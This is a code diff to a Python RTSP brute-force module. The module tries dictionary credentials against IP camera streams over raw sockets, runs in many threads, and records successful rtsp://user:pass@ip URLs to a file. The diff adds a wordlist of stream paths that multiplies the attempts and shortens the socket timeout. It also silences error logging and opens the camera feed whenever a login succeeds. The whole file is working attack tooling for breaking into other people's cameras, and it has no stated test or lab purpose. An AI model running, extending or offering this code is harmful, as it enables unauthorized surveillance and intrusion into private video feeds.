@@ -15,27 +15,29 @@ class RTSPBruteModule:
     def __init__(self):
         self.targets = []
         self.credentials = []
+        self.extra_paths = []
         self.pause_duration = 1
         self.max_threads = 50
-        self.timeout = 5
+        self.timeout = 1.5
         self.total_combinations = 0
         self.completed_combinations = 0
         self.seen_ips = set()
 
-    def setup(self, targets, dictionary_file, pause_duration=1, max_threads=50, timeout=5):
+    def setup(self, targets, dictionary_file, extra_file, pause_duration=1, max_threads=50, timeout=5):
         self.targets = targets
-        self.credentials = self.load_credentials(dictionary_file)
+        self.credentials = self.load_file(dictionary_file)
+        self.extra_paths = self.load_file(extra_file)
         self.pause_duration = pause_duration
         self.max_threads = max_threads
         self.timeout = timeout
-        self.total_combinations = len(targets) * len(self.credentials)
+        self.total_combinations = len(targets) * len(self.credentials) * len(self.extra_paths)
 
-    def load_credentials(self, dictionary_file):
+    def load_file(self, filename):
         try:
-            with open(dictionary_file, 'r') as f:
+            with open(filename, 'r') as f:
                 return [line.strip() for line in f.readlines()]
         except FileNotFoundError:
-            logging.error(f"Dictionary file {dictionary_file} not found.")
+            logging.error(f"File {filename} not found.")
             return []
 
     def run(self):
@@ -53,7 +55,6 @@ class RTSPBruteModule:
                     future.add_done_callback(lambda _: pbar.update())
                     tasks.append(future)
                 
-                # Esperar a que todas las tareas se completen
                 concurrent.futures.wait(tasks)
 
         logging.info("[*] Finished all threads")
@@ -61,7 +62,6 @@ class RTSPBruteModule:
     def generate_queue(self):
         queue_instance = queue.Queue()
 
-        # Cargar las IPs ya vistas desde el archivo
         if os.path.exists("RTSPCONECT.txt"):
             with open("RTSPCONECT.txt", "r") as file:
                 lines = file.readlines()
@@ -72,21 +72,12 @@ class RTSPBruteModule:
         for target in self.targets:
             ip, port = target
             if ip not in self.seen_ips:
-                # Verificar si la IP ya está en el archivo RTSPCONECT.txt
-                if os.path.exists("RTSPCONECT.txt"):
-                    with open("RTSPCONECT.txt", "r") as file:
-                        if any(ip in line for line in file):
-                            self.seen_ips.add(ip)
-                        else:
-                            for credential in self.credentials:
-                                queue_instance.put((target, credential))
-                else:
-                    for credential in self.credentials:
-                        queue_instance.put((target, credential))
+                for credential in self.credentials:
+                    queue_instance.put((target, credential, self.extra_paths))
 
         return queue_instance
 
-    def rtsp_request(self, target, credential):
+    def rtsp_request(self, target, credential, extra_paths):
         ip, port = target
         passwToBytes = credential.encode('ascii')
         passwToB64 = base64.b64encode(passwToBytes)
@@ -101,27 +92,32 @@ class RTSPBruteModule:
         ]
 
         for auth in auth_methods:
-            req = (
-                f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\n"
-                f"CSeq: 2\r\n"
-                f"{auth}\r\n"
-            )
+            for path in extra_paths:
+                req = (
+                    f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
+                    f"CSeq: 2\r\n"
+                    f"{auth}\r\n"
+                )
 
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(self.timeout)
-                s.connect((ip, int(port)))
-                encodereq = req.encode('ascii')
-                s.sendall(encodereq)
-                data = s.recv(1024)
-                response = data.decode('ascii')
-                s.close()
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(self.timeout)
+                    s.connect((ip, int(port)))
+                    encodereq = req.encode('ascii')
+                    s.sendall(encodereq)
+                    data = s.recv(1024)
+                    response = data.decode('ascii')
+                    s.close()
 
-                if "200 OK" in response:
-                    url = f"rtsp://{credential}@{ip}:{port}/"
-                    return self.display_camera(url)
-            except socket.error as e:
-                continue
+                    if "200 OK" in response:
+                        url = f"rtsp://{credential}@{ip}:{port}{path}"
+                        return self.display_camera(url)
+                except socket.timeout:
+                    #logging.error(f"Socket timeout for {ip}:{port} with {credential}")
+                    pass
+                except socket.error as e:
+                    #logging.error(f"Socket error for {ip}:{port} with {credential}: {e}")
+                    pass
 
         return False
 
@@ -153,7 +149,6 @@ class RTSPBruteModule:
         with open("RTSPCONECT.txt", "r") as file:
             lines = file.readlines()
 
-        # Eliminar duplicados y verificar si la IP ya está en la lista
         new_lines = []
         seen_ips = set()
         for line in lines:
@@ -162,7 +157,6 @@ class RTSPBruteModule:
                 seen_ips.add(saved_ip)
                 new_lines.append(line)
         
-        # Agregar nuevo URL si la IP no existe
         if ip not in seen_ips:
             new_lines.append(url + '\n')
             self.seen_ips.add(ip)
@@ -171,8 +165,8 @@ class RTSPBruteModule:
             file.writelines(new_lines)
 
     def brute_force(self, task):
-        target, credential = task
+        target, credential, extra_paths = task
         ip, port = target
-        if not self.rtsp_request(target, credential):
+        if not self.rtsp_request(target, credential, extra_paths):
             logging.info(f"Failed login for {ip}:{port} with {credential}")
         time.sleep(self.pause_duration)
